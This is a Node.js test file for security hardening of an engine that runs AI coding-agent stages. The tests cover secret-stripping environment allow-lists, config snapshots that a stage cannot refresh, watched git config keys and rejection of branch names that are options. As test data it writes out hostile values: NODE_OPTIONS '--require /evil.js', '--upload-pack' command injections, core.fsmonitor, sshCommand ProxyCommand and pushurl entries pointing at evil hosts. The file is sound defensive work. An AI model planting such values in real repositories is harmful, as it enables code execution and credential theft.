// node --test tests/autopilot/hardening.test.mjs
// The audit-2026-10-23 hardening of the autopilot engine: the stage environment as an allow-list
// (M6, L3), remote MCP servers out of the stage snapshot (L11), the snapshot of the config a ticket
// runs under (L1), repository-local git config that runs programs (L2), configured branch names
// that cannot be options (L4), and no bare tool names (M10).
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawn, spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

import * as lib from '../../skills/autopilot/scripts/autopilot-lib.mjs';
import * as repos from '../../skills/autopilot/scripts/repos.mjs';
import { HARNESSES } from '../../skills/autopilot/scripts/harnesses.mjs';
import { trackerFor } from '../../skills/autopilot/scripts/tracker.mjs';
import { resolveTool } from '../../hooks/lib/resolve-tool.mjs';
import { makeWorkspace as workspace, git } from './fixtures/make-workspace.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const REPO = path.resolve(HERE, '..', '..');
const ENGINE = path.join(REPO, 'skills', 'autopilot', 'scripts', 'autopilot.mjs');
const HARNESS_STUB = path.join(HERE, 'fixtures', 'harness-stub.mjs');
const win = process.platform === 'win32';
const exe = win ? '.exe' : '';

function run(ws, args, extraEnv = {}) {
  const result = spawnSync(process.execPath, [ENGINE, ...args, '--root', ws.root], { cwd: ws.root, encoding: 'utf8', env: { ...ws.env, ...extraEnv } });
  let json = null;
  try { json = JSON.parse(result.stdout); } catch { json = null; }
  return { code: result.status, json, stdout: result.stdout, stderr: result.stderr };
}

const markerFile = (ws) => path.join(ws.root, '.agents', 'ultrapowers.json');
const readMarker = (ws) => JSON.parse(fs.readFileSync(markerFile(ws), 'utf8'));
const writeMarker = (ws, mutate) => {
  const m = readMarker(ws);
  mutate(m);
  fs.writeFileSync(markerFile(ws), `${JSON.stringify(m, null, 2)}\n`);
};
const state = (ws, id = 'GH-16') => JSON.parse(fs.readFileSync(path.join(ws.root, 'tasks', id, 'autopilot.json'), 'utf8'));

// ---------------------------------------------------------------------------------------------
// M6 + L3: the stage environment is an allow-list
// ---------------------------------------------------------------------------------------------

const BASE_ENV = {
  PATH: '/usr/bin', HOME: '/home/u', LANG: 'C', LC_ALL: 'C', TERM: 'xterm', TMPDIR: '/tmp', USER: 'u',
  ULTRAPOWERS_CLAUDE: '/x/claude.mjs',
};

test('stageEnvFrom: the toolchain base passes, ODOO_API_KEY and a secrets-file key do not', () => {
  const env = { ...BASE_ENV, ODOO_API_KEY: 'k1', DB_PASSWORD_KEY: 's3', AWS_SECRET_ACCESS_KEY: 'a', NODE_OPTIONS: '--require /evil.js' };
  const out = lib.stageEnvFrom(env, { harness: 'claude-code', platform: 'linux' });
  assert.equal(out.PATH, '/usr/bin');
  assert.equal(out.HOME, '/home/u');
  assert.equal(out.LC_ALL, 'C');
  assert.equal(out.ULTRAPOWERS_CLAUDE, '/x/claude.mjs', 'ULTRAPOWERS_* passes');
  assert.equal(out.ODOO_API_KEY, undefined);
  assert.equal(out.DB_PASSWORD_KEY, undefined);
  assert.equal(out.AWS_SECRET_ACCESS_KEY, undefined);
  assert.equal(out.NODE_OPTIONS, undefined, 'NODE_OPTIONS never passes');
  assert.equal(out.ULTRAPOWERS_AUTOPILOT_INSIDE, '1');
  assert.equal(out.GIT_TERMINAL_PROMPT, '0');
});

test('stageEnvFrom: NODE_OPTIONS never passes, not even when the project or a harness lists it', () => {
  const env = { ...BASE_ENV, NODE_OPTIONS: '--require /evil.js', ANTHROPIC_API_KEY: 'sk' };
  const out = lib.stageEnvFrom(env, { harness: 'claude-code', extra: ['NODE_OPTIONS', 'NODE_*'], mcpNames: ['NODE_OPTIONS'], platform: 'linux' });
  assert.equal(out.NODE_OPTIONS, undefined);
});

test('stageEnvFrom: a name an MCP server of the snapshot references passes', () => {
  const env = { ...BASE_ENV, ODOO_API_KEY: 'k1', OTHER_KEY: 'o' };
  const out = lib.stageEnvFrom(env, { harness: 'claude-code', mcpNames: ['ODOO_API_KEY'], platform: 'linux' });
  assert.equal(out.ODOO_API_KEY, 'k1');
  assert.equal(out.OTHER_KEY, undefined);
});

test('stageEnvFrom: the harness auth names pass for that harness only', () => {
  const env = { ...BASE_ENV, ANTHROPIC_API_KEY: 'sk-a', OPENAI_API_KEY: 'sk-o', CLAUDE_CODE_OAUTH_TOKEN: 'oa' };
  const claude = lib.stageEnvFrom(env, { harness: 'claude-code', platform: 'linux' });
  assert.equal(claude.ANTHROPIC_API_KEY, 'sk-a');
  assert.equal(claude.CLAUDE_CODE_OAUTH_TOKEN, 'oa');
  assert.equal(claude.OPENAI_API_KEY, undefined);
  const codex = lib.stageEnvFrom(env, { harness: 'codex', platform: 'linux' });
  assert.equal(codex.OPENAI_API_KEY, 'sk-o');
  assert.equal(codex.ANTHROPIC_API_KEY, undefined);
});

test('stageEnvFrom: autopilot.stageEnv names and PREFIX_* patterns add variables', () => {
  const env = { ...BASE_ENV, MY_SERVICE_URL: 'u', MYAPP_ONE: '1', MYAPP_TWO: '2', MYAPPLE: 'no', UNLISTED: 'x' };
  const out = lib.stageEnvFrom(env, { harness: 'claude-code', extra: ['MY_SERVICE_URL', 'MYAPP_*'], platform: 'linux' });
  assert.deepEqual([out.MY_SERVICE_URL, out.MYAPP_ONE, out.MYAPP_TWO, out.MYAPPLE, out.UNLISTED], ['u', '1', '2', undefined, undefined]);
});

test('stageEnvFrom: without stage credentials the engine tokens pass, as before', () => {
  const env = { ...BASE_ENV, GH_TOKEN: 'g', GITHUB_TOKEN: 'g2', GITLAB_TOKEN: 'l', GLAB_TOKEN: 'l2', GL_TOKEN: 'l3', SSH_AUTH_SOCK: '/s', GIT_SSH_COMMAND: 'ssh -i k' };
  const out = lib.stageEnvFrom(env, { harness: 'claude-code', platform: 'linux' });
  assert.deepEqual([out.GH_TOKEN, out.GITHUB_TOKEN, out.GITLAB_TOKEN, out.GLAB_TOKEN, out.GL_TOKEN], ['g', 'g2', 'l', 'l2', 'l3']);
  assert.equal(out.SSH_AUTH_SOCK, '/s');
  assert.equal(out.GIT_SSH_COMMAND, 'ssh -i k');
});

test('stageEnvFrom: with stage credentials the stage gets only the mapped stage tokens', () => {
  const env = {
    ...BASE_ENV, GH_TOKEN: 'engine-g', GITLAB_TOKEN: 'engine-l', GITHUB_TOKEN: 'x', SSH_AUTH_SOCK: '/s', GIT_SSH_COMMAND: 'ssh', GIT_SSH: 'ssh',
    ULTRAPOWERS_STAGE_GH_TOKEN: 'ro-g', ULTRAPOWERS_STAGE_GITLAB_TOKEN: 'ro-l', GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'user.name', GIT_CONFIG_VALUE_0: 'x',
  };
  const out = lib.stageEnvFrom(env, { harness: 'claude-code', noAuthDir: '/ws/.ultrapowers/autopilot/no-auth', platform: 'linux' });
  assert.equal(out.GH_TOKEN, 'ro-g');
  assert.equal(out.GITLAB_TOKEN, 'ro-l');
  assert.equal(out.GITHUB_TOKEN, undefined);
  assert.equal(out.SSH_AUTH_SOCK, undefined);
  assert.equal(out.GIT_SSH_COMMAND, undefined);
  assert.equal(out.GIT_SSH, undefined);
  assert.equal(out.ULTRAPOWERS_STAGE_GH_TOKEN, undefined, 'the stage token names are mapped, not passed on');
  assert.equal(out.ULTRAPOWERS_STAGE_GITLAB_TOKEN, undefined);
  assert.match(out.GH_CONFIG_DIR, /no-auth/);
  assert.match(out.GLAB_CONFIG_DIR, /no-auth/);
  assert.equal(out.GIT_CONFIG_KEY_0, 'credential.helper', 'the credential helper is reset');
  assert.equal(out.GIT_CONFIG_VALUE_0, '');
  assert.equal(out.GIT_CONFIG_COUNT, '1', 'the engine process own GIT_CONFIG_* pins are not passed on');
  const listed = lib.stageEnvFrom(env, { harness: 'claude-code', extra: ['GIT_CONFIG_*'], noAuthDir: '/x', platform: 'linux' });
  assert.equal(listed.GIT_CONFIG_KEY_0, 'user.name', 'a project that lists them keeps them');
  assert.equal(listed.GIT_CONFIG_KEY_1, 'credential.helper', 'and the helper is reset behind them');
  assert.equal(listed.GIT_CONFIG_COUNT, '2');
});

test('stageEnvFrom: on Windows names match case-insensitively', () => {
  const env = { Path: 'C:\\Windows', SystemRoot: 'C:\\Windows', UserProfile: 'C:\\Users\\u', ProgramFiles: 'C:\\PF', 'ProgramFiles(x86)': 'C:\\PF86', Anthropic_Api_Key: 'k', Secret_Thing: 's', NODE_options: 'x' };
  const out = lib.stageEnvFrom(env, { harness: 'claude-code', platform: 'win32' });
  assert.equal(out.Path, 'C:\\Windows');
  assert.equal(out.SystemRoot, 'C:\\Windows');
  assert.equal(out.UserProfile, 'C:\\Users\\u');
  assert.equal(out['ProgramFiles(x86)'], 'C:\\PF86');
  assert.equal(out.Anthropic_Api_Key, 'k');
  assert.equal(out.Secret_Thing, undefined);
  assert.equal(out.NODE_options, undefined);
  const posix = lib.stageEnvFrom({ path: '/x', Path: '/y', PATH: '/usr/bin' }, { harness: 'claude-code', platform: 'linux' });
  assert.deepEqual(Object.keys(posix).filter((k) => k.toLowerCase() === 'path'), ['PATH'], 'on posix the match is exact');
});

test('mcpEnvNames: every ${NAME} an MCP config references, in env, headers, args and url', () => {
  const text = JSON.stringify({
    mcpServers: {
      odoo: { type: 'http', url: 'https://x/${ODOO_HOST}/mcp', headers: { Authorization: 'Bearer ${ODOO_API_KEY}' } },
      local: { command: 'node', args: ['s.js', '--k=${LOCAL_KEY:-dflt}'], env: { A: '${A_TOKEN}', B: 'literal' } },
    },
  });
  assert.deepEqual([...lib.mcpEnvNames(text)].sort(), ['A_TOKEN', 'LOCAL_KEY', 'ODOO_API_KEY', 'ODOO_HOST']);
  assert.deepEqual(lib.mcpEnvNames('not json ${BARE_NAME}'), ['BARE_NAME']);
  assert.deepEqual(lib.mcpEnvNames(''), []);
});

test('autopilot.stageEnv is validated: names or PREFIX_* patterns only', () => {
  const ok = { mode: 'gated', stageEnv: ['MY_VAR', 'MYAPP_*', '_x1'] };
  assert.deepEqual(lib.validateAutopilot(ok), []);
  assert.deepEqual(lib.effectiveAutopilot({ autopilot: ok }).stageEnv, ['MY_VAR', 'MYAPP_*', '_x1']);
  assert.deepEqual(lib.effectiveAutopilot({ autopilot: { mode: 'gated' } }).stageEnv, []);
  for (const bad of [['a b'], ['*'], ['A*B'], ['1ABC'], [''], 'MYAPP_*', [1], ['A=B'], ['A-B']]) {
    assert.ok(lib.validateAutopilot({ mode: 'gated', stageEnv: bad }).some((e) => /stageEnv/.test(e)), `${JSON.stringify(bad)} is refused`);
  }
});

test('every headless adapter lists the auth names its harness reads', () => {
  for (const [name, adapter] of Object.entries(HARNESSES)) {
    assert.ok(Array.isArray(adapter.envAllow) && adapter.envAllow.length > 0, `${name} has envAllow`);
    for (const entry of adapter.envAllow) assert.match(entry, /^[A-Za-z_][A-Za-z0-9_]*\*?$/, `${name}: ${entry}`);
  }
  assert.ok(HARNESSES['claude-code'].envAllow.includes('ANTHROPIC_*'));
  assert.ok(HARNESSES.codex.envAllow.includes('OPENAI_*'));
  assert.ok(HARNESSES.gemini.envAllow.includes('GEMINI_*'));
});

// ---------------------------------------------------------------------------------------------
// The environment a watcher stage really gets (through the engine)
// ---------------------------------------------------------------------------------------------

function stageProbe(ws) {
  // A stand-in harness that logs the whole environment it got, then exits non-zero: the engine blocks the stage.
  const probe = path.join(ws.base, 'autopilot-env-probe.mjs');
  fs.writeFileSync(probe, [
    "import fs from 'node:fs';",
    "fs.writeFileSync(process.env.PROBE_OUT, JSON.stringify(process.env));",
    'process.exit(3);',
    '',
  ].join('\n'));
  return probe;
}

test('a watcher stage holds no ODOO_API_KEY or secrets-file key unless the MCP snapshot names it', () => {
  const ws = workspace({ autopilot: { mode: 'gated', baseBranch: 'main', stageEnv: ['PROBE_*'] } });
  fs.writeFileSync(path.join(ws.root, '.agents', 'mcp-secrets.env'), 'export SECRETS_FILE_TOKEN=from-file\n');
  const out = path.join(ws.base, 'autopilot-env-out.json');
  const env = {
    ULTRAPOWERS_CLAUDE: stageProbe(ws), PROBE_OUT: out, ODOO_API_KEY: 'k-odoo', NODE_OPTIONS: '--no-warnings', ANTHROPIC_API_KEY: 'sk-ant',
    OTHER_LOCAL_SECRET: 'zzz', ULTRAPOWERS_STAGE_GH_TOKEN: '', ULTRAPOWERS_STAGE_GITLAB_TOKEN: '',
  };
  const r = run(ws, ['run', 'GH-16', '--once'], env);
  assert.ok(fs.existsSync(out), `the stage ran: ${r.stdout}${r.stderr}`);
  const seen = JSON.parse(fs.readFileSync(out, 'utf8'));
  assert.equal(seen.ODOO_API_KEY, undefined, 'the Odoo key is not in the stage');
  assert.equal(seen.SECRETS_FILE_TOKEN, undefined, 'a key from mcp-secrets.env is not in the stage');
  assert.equal(seen.OTHER_LOCAL_SECRET, undefined);
  assert.equal(seen.NODE_OPTIONS, undefined);
  assert.equal(seen.ANTHROPIC_API_KEY, 'sk-ant', 'the harness auth passes');
  assert.equal(seen.PROBE_OUT, out, 'autopilot.stageEnv passes what the project lists');
  assert.equal(seen.ULTRAPOWERS_AUTOPILOT_INSIDE, '1');
  assert.ok(seen.PATH || seen.Path, 'PATH passes');
});

test('a watcher stage holds the keys the MCP snapshot references', () => {
  const ws = workspace({ autopilot: { mode: 'gated', baseBranch: 'main', stageEnv: ['PROBE_*'] } });
  fs.writeFileSync(path.join(ws.root, '.mcp.json'), JSON.stringify({ mcpServers: { odoo: { command: 'node', args: ['odoo-mcp.js'], env: { KEY: '${ODOO_API_KEY}' } } } }));
  fs.writeFileSync(path.join(ws.root, '.agents', 'mcp-secrets.env'), 'export SECRETS_FILE_TOKEN=from-file\n');
  const out = path.join(ws.base, 'autopilot-env-out2.json');
  const env = { ULTRAPOWERS_CLAUDE: stageProbe(ws), PROBE_OUT: out, ODOO_API_KEY: 'k-odoo', ULTRAPOWERS_STAGE_GH_TOKEN: '', ULTRAPOWERS_STAGE_GITLAB_TOKEN: '' };
  run(ws, ['run', 'GH-16', '--once'], env);
  const seen = JSON.parse(fs.readFileSync(out, 'utf8'));
  assert.equal(seen.ODOO_API_KEY, 'k-odoo');
  assert.equal(seen.SECRETS_FILE_TOKEN, undefined);
});

// ---------------------------------------------------------------------------------------------
// L11: remote MCP servers stay out of the stage snapshot
// ---------------------------------------------------------------------------------------------

test('filterMcpServers keeps local command servers and drops http, sse, streamable-http and url servers', () => {
  const input = {
    mcpServers: {
      local: { command: 'node', args: ['a.js'] },
      stdio: { type: 'stdio', command: 'npx', args: ['x'] },
      http: { type: 'http', url: 'https://x/mcp', headers: { Authorization: 'Bearer ${ODOO_API_KEY}' } },
      sse: { type: 'sse', url: 'https://x/sse' },
      stream: { type: 'streamable-http', url: 'https://x/s' },
      urlOnly: { url: 'https://x/u' },
      mixed: { command: 'node', url: 'https://x/m' },
      typedCommand: { type: 'http', command: 'node' },
      noCommand: { type: 'stdio' },
      emptyCommand: { command: '' },
    },
    other: 'kept',
  };
  const out = JSON.parse(lib.filterMcpServers(JSON.stringify(input)));
  assert.deepEqual(Object.keys(out.mcpServers).sort(), ['local', 'stdio']);
  assert.equal(out.other, 'kept', 'the other keys are untouched');
  assert.deepEqual(out.mcpServers.local, input.mcpServers.local);
  assert.equal(lib.filterMcpServers('not json'), '{"mcpServers":{}}', 'an unreadable config loads no server');
  assert.equal(lib.filterMcpServers(JSON.stringify({ mcpServers: ['x'] })), '{"mcpServers":{}}');
});

test('begin writes the filtered MCP snapshot: a remote server of the project never reaches a stage', () => {
  const ws = workspace();
  fs.writeFileSync(path.join(ws.root, '.mcp.json'), JSON.stringify({ mcpServers: { odoo: { type: 'http', url: 'https://odoo.example/mcp', headers: { Authorization: 'Bearer ${ODOO_API_KEY}' } }, local: { command: 'node', args: ['x.js'] } } }));
  const r = run(ws, ['begin', 'GH-16', 'scaffold']);
  assert.equal(r.code, 0, r.stdout + r.stderr);
  const snap = JSON.parse(fs.readFileSync(path.join(ws.root, '.ultrapowers', 'autopilot', 'mcp.json'), 'utf8'));
  assert.deepEqual(Object.keys(snap.mcpServers), ['local']);
});

// ---------------------------------------------------------------------------------------------
// L1: the config a ticket runs under is snapshotted
// ---------------------------------------------------------------------------------------------

const configSnapshot = (ws, id = 'GH-16') => path.join(ws.root, '.ultrapowers', 'autopilot', `${id}.config.json`);
// A comment by the engine's own account (as the tracker stub lists them), stamped at `at`.
const postComment = (ws, body, at, issue = '16') => {
  const file = path.join(ws.stubDir, 'posted.json');
  const posted = fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : [];
  posted.push({ id: 9500 + posted.length, issue, user: { login: 'engine-bot' }, created_at: at, html_url: `https://github.com/o/r/issues/${issue}#issuecomment-${9500 + posted.length}`, body });
  fs.writeFileSync(file, JSON.stringify(posted));
};

test('begin snapshots the config; later commands with the file unchanged pass', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  assert.ok(fs.existsSync(configSnapshot(ws)), 'the snapshot is taken at begin');
  const snap = JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8'));
  assert.deepEqual(snap.autopilot, readMarker(ws).autopilot);
  assert.deepEqual(snap.tickets, readMarker(ws).tickets);
  // An unrelated key may change: only the snapshot keys (tickets, autopilot, repos, topology, qa, kb) are guarded.
  writeMarker(ws, (m) => { m.somethingElse = 'changed'; });
  const status = run(ws, ['status', 'GH-16']);
  assert.equal(status.code, 0, status.stdout + status.stderr);
});

test('a changed autopilot key blocks the ticket, names the key and says to re-run begin', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  writeMarker(ws, (m) => { m.autopilot.mode = 'full'; });
  const r = run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'config-changed');
  assert.match(r.json.error.message, /autopilot\.mode/);
  assert.match(r.json.error.message, /begin/);
  assert.ok(!fs.existsSync(path.join(ws.root, '.ultrapowers', 'autopilot-active')), 'the run marker is released');
  assert.ok(ws.calls().some((a) => a.includes('--add-label') && a.includes('up:blocked')), 'the ticket is labelled blocked');
});

test('a changed tickets source blocks the ticket, and the tracker still talks to the snapshot source', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  fs.mkdirSync(path.join(ws.root, 'tasks', 'GH-16'), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', 'GH-16', 'GH-16.md'), '# GH-16 - Fix it now please\n');
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  writeMarker(ws, (m) => { m.tickets.sources[0].owner = 'attacker'; m.tickets.sources[0].host = 'evil.example'; });
  const r = run(ws, ['next', 'GH-16']);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'config-changed');
  assert.match(r.json.error.message, /tickets\.sources/);
  assert.ok(ws.calls().every((a) => !a.join(' ').includes('attacker')), 'no call reaches the changed source');
  assert.equal(state(ws).stageStatus, 'blocked');
  // Repeating the command does not post another comment.
  const before = ws.calls().length;
  const again = run(ws, ['next', 'GH-16']);
  assert.equal(again.json.error.code, 'config-changed');
  assert.equal(ws.calls().filter((a) => a.includes('--add-label')).length, ws.calls().slice(0, before).filter((a) => a.includes('--add-label')).length, 'the block is reported once');
});

test('begin run again after the change is checked takes a fresh snapshot, and the ticket goes on', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  fs.mkdirSync(path.join(ws.root, 'tasks', 'GH-16'), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', 'GH-16', 'GH-16.md'), '# GH-16 - Fix it now please\n');
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  writeMarker(ws, (m) => { m.autopilot.approvers = ['alice']; });
  assert.equal(run(ws, ['next', 'GH-16']).json.error.code, 'config-changed');
  const again = run(ws, ['begin', 'GH-16', 'spec']);
  assert.equal(again.code, 0, again.stdout + again.stderr);
  assert.deepEqual(JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8')).autopilot.approvers, ['alice']);
  assert.equal(run(ws, ['status', 'GH-16']).code, 0);
});

test('a begin from inside an open stage never refreshes the snapshot', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  writeMarker(ws, (m) => { m.autopilot.mode = 'full'; });
  const again = run(ws, ['begin', 'GH-16', 'scaffold']);
  assert.equal(again.json.error.code, 'config-changed', 'the stage is open: only a human with no stage open refreshes');
  const inside = run(ws, ['begin', 'GH-16', 'scaffold'], { ULTRAPOWERS_AUTOPILOT_INSIDE: '1' });
  assert.equal(inside.json.error.code, 'config-changed');
  assert.equal(JSON.parse(fs.readFileSync(configSnapshot(ws), 'utf8')).autopilot.mode, 'gated');
});

// ---------------------------------------------------------------------------------------------
// L2: repository-local git config that runs programs
// ---------------------------------------------------------------------------------------------

const GIT_ENV = {
  GIT_AUTHOR_NAME: 'Test', GIT_AUTHOR_EMAIL: 'test@example.com',
  GIT_COMMITTER_NAME: 'Test', GIT_COMMITTER_EMAIL: 'test@example.com',
  GIT_CONFIG_GLOBAL: path.join(os.tmpdir(), 'autopilot-hardening-gitconfig'),
};
fs.writeFileSync(GIT_ENV.GIT_CONFIG_GLOBAL, '');
Object.assign(process.env, GIT_ENV);

function tempRepo() {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), 'autopilot-hardening-'));
  fs.mkdirSync(path.join(base, '.agents'));
  fs.writeFileSync(path.join(base, '.agents', 'ultrapowers.json'), '{}');
  git(base, 'init', '-q', '-b', 'main');
  fs.writeFileSync(path.join(base, 'a.txt'), 'a\n');
  git(base, 'add', '-A');
  git(base, 'commit', '-q', '-m', 'seed');
  return base;
}

test('gitConfigSnapshot lists the keys that run a program or redirect a remote, and no others', () => {
  const dir = tempRepo();
  git(dir, 'config', 'user.name', 'Someone');
  git(dir, 'config', 'core.filemode', 'false');
  git(dir, 'config', 'core.fsmonitor', 'x');
  git(dir, 'config', 'alias.st', '!echo');
  git(dir, 'config', 'filter.lfs.clean', 'x');
  git(dir, 'config', 'diff.ext.command', 'x');
  git(dir, 'config', 'diff.ext.textconv', 'x');
  git(dir, 'config', 'merge.drv.driver', 'x');
  git(dir, 'config', 'credential.helper', 'store');
  git(dir, 'config', 'url.https://evil/.insteadOf', 'https://good/');
  git(dir, 'config', 'gpg.program', 'x');
  git(dir, 'config', 'include.path', 'x');
  git(dir, 'config', 'includeIf.gitdir:/x/.path', 'x');
  const keys = repos.gitConfigSnapshot(dir).map((e) => e.split('=')[0]);
  for (const k of ['core.fsmonitor', 'alias.st', 'filter.lfs.clean', 'diff.ext.command', 'diff.ext.textconv', 'merge.drv.driver', 'credential.helper', 'url.https://evil/.insteadof', 'gpg.program', 'include.path']) {
    assert.ok(keys.includes(k), `${k} is watched: ${keys.join(', ')}`);
  }
  assert.ok(keys.some((k) => k.startsWith('includeif.')), 'includeIf is watched');
  assert.ok(!keys.includes('user.name') && !keys.includes('core.filemode'), 'unrelated keys are not');
});

test('gitConfigChanges: an added or changed watched key is reported, an unrelated one is not', () => {
  const dir = tempRepo();
  git(dir, 'config', 'core.sshCommand', 'ssh -o A=b');
  const before = repos.gitConfigSnapshot(dir);
  assert.deepEqual(repos.gitConfigChanges(dir, before), []);
  git(dir, 'config', 'user.email', 'new@example.com');
  git(dir, 'config', 'branch.main.remote', 'origin');
  assert.deepEqual(repos.gitConfigChanges(dir, before), [], 'user.* and branch.* are not watched');
  git(dir, 'config', 'core.fsmonitor', 'evil-monitor');
  git(dir, 'config', 'core.sshCommand', 'ssh -o ProxyCommand=evil');
  git(dir, 'config', 'alias.pwn', '!evil');
  git(dir, 'config', '--add', 'remote.origin.pushurl', 'https://evil.example/x.git');
  const changes = repos.gitConfigChanges(dir, before).sort();
  assert.deepEqual(changes, ['alias.pwn', 'core.fsmonitor', 'core.sshcommand', 'remote.origin.pushurl']);
  git(dir, 'config', '--unset', 'core.sshCommand');
  assert.ok(repos.gitConfigChanges(dir, before).includes('core.sshcommand'), 'a removed key is a change too');
});

test('gitConfigChanges also reads config.worktree when the repository uses extensions.worktreeConfig', () => {
  const dir = tempRepo();
  git(dir, 'config', 'extensions.worktreeConfig', 'true');
  const before = repos.gitConfigSnapshot(dir);
  git(dir, 'config', '--worktree', 'core.fsmonitor', 'evil');
  assert.deepEqual(repos.gitConfigChanges(dir, before), ['core.fsmonitor']);
});

test('the engine git pins core.askPass to nothing, and leaves credential.helper and gpg.program alone', () => {
  const dir = tempRepo();
  const argv = repos.gitArgs(dir, ['status']);
  const joined = argv.join(' ');
  assert.match(joined, /-c core\.askPass=(?= |$)/);
  assert.doesNotMatch(joined, /credential\.helper/);
  assert.doesNotMatch(joined, /gpg\.program/);
});

test('a key a stage adds to .git/config blocks end before anything is committed', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  fs.mkdirSync(path.join(ws.root, 'tasks', 'GH-16'), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', 'GH-16', 'GH-16.md'), '# GH-16 - Fix it now please\n');
  git(ws.root, 'config', 'filter.pwn.clean', 'evil-program');
  const headBefore = git(ws.root, 'rev-parse', 'HEAD');
  const r = run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'git-config-changed');
  assert.match(r.json.error.message, /filter\.pwn\.clean/);
  assert.equal(git(ws.root, 'rev-parse', 'HEAD'), headBefore, 'the engine committed nothing');
});

test('pr is blocked by a watched key added since begin', () => {
  const ws = workspace();
  assert.equal(run(ws, ['begin', 'GH-16', 'scaffold']).code, 0);
  fs.mkdirSync(path.join(ws.root, 'tasks', 'GH-16'), { recursive: true });
  fs.writeFileSync(path.join(ws.root, 'tasks', 'GH-16', 'GH-16.md'), '# GH-16 - Fix it now please\n');
  assert.equal(run(ws, ['end', 'GH-16', 'scaffold', '--result', JSON.stringify({ ok: true })]).code, 0);
  git(ws.root, 'config', 'core.hooksPath', '/tmp/evil-hooks');
  const r = run(ws, ['pr', 'GH-16']);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'git-config-changed');
});

// ---------------------------------------------------------------------------------------------
// L4: configured branch names cannot be options
// ---------------------------------------------------------------------------------------------

test('checkBranchName refuses an option, a bad ref name and a reflog expression', () => {
  const root = tempRepo();
  assert.equal(repos.checkBranchName(root, 'main'), null);
  assert.equal(repos.checkBranchName(root, 'release/2026.10'), null);
  for (const bad of ['--upload-pack=x', '-x', 'a..b', 'a b', '@{-1}', 'a~1', 'a:b', '', 'x.lock', 'a\nb']) {
    assert.match(String(repos.checkBranchName(root, bad)), /branch/i, `${JSON.stringify(bad)} is refused`);
  }
});

test('autopilot.baseBranch that is an option is refused at validation', () => {
  const errors = lib.validateAutopilot({ mode: 'gated', baseBranch: '--upload-pack=touch /tmp/x' });
  assert.ok(errors.some((e) => /baseBranch/.test(e)), errors.join('; '));
  assert.deepEqual(lib.validateAutopilot({ mode: 'gated', baseBranch: 'release/1.2' }), []);
  assert.throws(() => lib.effectiveAutopilot({ autopilot: { mode: 'gated', baseBranch: '-x' } }), (err) => err.code === 'bad-autopilot');
});

test('a base branch that is an option is refused by the engine: baseBranch and repos[].defaultBranch', () => {
  const ws = workspace({ nested: true });
  writeMarker(ws, (m) => { m.repos[0].defaultBranch = '--upload-pack=touch evil'; });
  const r = run(ws, ['begin', 'GH-16', 'scaffold']);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.equal(r.json.error.code, 'bad-branch');
  assert.match(r.json.error.message, /defaultBranch/);
  const ws2 = workspace({ autopilot: { mode: 'gated', baseBranch: '--upload-pack=touch evil' } });
  const r2 = run(ws2, ['begin', 'GH-16', 'scaffold']);
  assert.equal(r2.json.error.code, 'bad-autopilot');
});

test('ensureBranch and ensureWorktree refuse a base that is an option and run no fetch with it', () => {
  const dir = tempRepo();
  git(dir, 'remote', 'add', 'origin', path.join(dir, 'nowhere.git'));
  const marker = path.join(dir, 'upload-pack-ran');
  const evil = `--upload-pack=node -e "require('fs').writeFileSync('${marker.replace(/\\/g, '/')}','x')"`;
  assert.throws(() => repos.ensureBranch(dir, 'GH-16-x', evil), (err) => err.code === 'bad-branch');
  assert.throws(() => repos.ensureWorktree(dir, 'GH-16-x', evil), (err) => err.code === 'bad-branch');
  assert.equal(fs.existsSync(marker), false);
});

test('a revision that is an option never reaches git as one', () => {
  const dir = tempRepo();
  assert.equal(repos.tip(dir, '--output=owned.txt'), null);
  assert.equal(repos.pathsChanged(dir, '--output=owned.txt', 'HEAD', ['a.txt']), true, 'an unreadable revision counts as changed');
  assert.equal(fs.existsSync(path.join(dir, 'owned.txt')), false);
});

// ---------------------------------------------------------------------------------------------
// M10: no bare tool names
// ---------------------------------------------------------------------------------------------

// A file the system would start by that name: on Windows node.exe copied (libuv finds <cwd>\git.exe
// before PATH); on posix a script that records that it ran.
function plantTool(dir, name, record) {
  const file = path.join(dir, `${name}${exe}`);
  if (win) fs.copyFileSync(process.execPath, file);
  else {
    fs.writeFileSync(file, `#!/bin/sh\necho ran > '${record}'\nexit 0\n`);
    fs.chmodSync(file, 0o755);
  }
  return file;
}

function pathWithout(...tools) {
  // The PATH of this process, minus any entry that holds one of the tools being tested.
  return process.env[win ? 'Path' : 'PATH'].split(path.delimiter).filter((d) => !tools.some((t) => {
    try { return fs.statSync(path.join(d, `${t}${exe}`)).isFile(); } catch { return false; }
  }));
}

